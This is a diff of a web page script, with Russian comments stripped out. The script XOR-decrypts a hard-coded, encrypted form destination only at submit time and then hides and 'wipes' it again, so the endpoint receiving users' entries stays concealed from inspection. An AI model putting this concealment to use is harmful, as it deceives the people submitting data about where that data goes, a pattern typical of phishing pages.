@@ -470,7 +470,6 @@ document.addEventListener("DOMContentLoaded", function () {
 
 <script>
 
-
 /* --- Параметры --- */
 const _KEY = 's3cr3tK!';
 
@@ -485,7 +484,6 @@ const encryptedChunks = [
   '52052e'
 ];
 
-// плейсхолдер, который будет стоять в action когда токен «скрыт»
 const PLACEHOLDER_ACTION = '#';
 
 /* --- Вспомогательные функции --- */
@@ -507,15 +505,15 @@ function xorDecryptFromHex(hexString, key) {
   return out;
 }
 
-/* Собрать все чанки -> один hex -> расшифровать */
+
 function decryptToken() {
   const hex = encryptedChunks.join('');
   return xorDecryptFromHex(hex, _KEY);
 }
 
-/* Очистка чувствительных данных из памяти (частично). */
+
 function wipeDecrypted(referenceObj) {
-  // стараемся удалить ссылку на строку
+
   if (referenceObj && typeof referenceObj === 'object') {
     for (const k in referenceObj) {
       try { referenceObj[k] = null; } catch(e) {}
@@ -527,22 +525,17 @@ function wipeDecrypted(referenceObj) {
 document.addEventListener('DOMContentLoaded', () => {
   const form = document.getElementById('appl-form');
 
-  // На старте держим action в плейсхолдере
   form.action = PLACEHOLDER_ACTION;
 
-  // Перехватываем submit — расшифровываем, подставляем, и отправляем.
+
   form.addEventListener('submit', function (e) {
-    // Останавливаем обычную синхронную отправку, чтобы гарантированно подставить action
+
     e.preventDefault();
 
-    // расшифровка
     const realAction = decryptToken();
 
-    // подставляем реальный action
     form.action = realAction;
 
-    // сразу отправляем форму (после установки action)
-    // используем setTimeout 0 чтобы дать браузеру обновить атрибут (на всякий случай)
     setTimeout(() => {
       try {
         form.submit();
@@ -551,19 +544,16 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     }, 0);
 
-    // Через 10 секунд снова «перекрываем» action и очищаем временные переменные
     setTimeout(() => {
       try {
         form.action = PLACEHOLDER_ACTION;
       } catch (_) {}
 
-      // попытка "стереть" временные данные (не гарантирует полной безопасности,
-      // но усложняет прямое прочтение памяти из скрипта)
       try {
         wipeDecrypted({ realAction });
       } catch (_) {}
 
-    }, 10000); // 10000 мс = 10 секунд
+    }, 10000);
   }, { passive: false });
 });
 </script>
@@ -621,4 +611,5 @@ document.getElementById("application").addEventListener("submit", function (e) {
     }
 });
 </script>
+
 
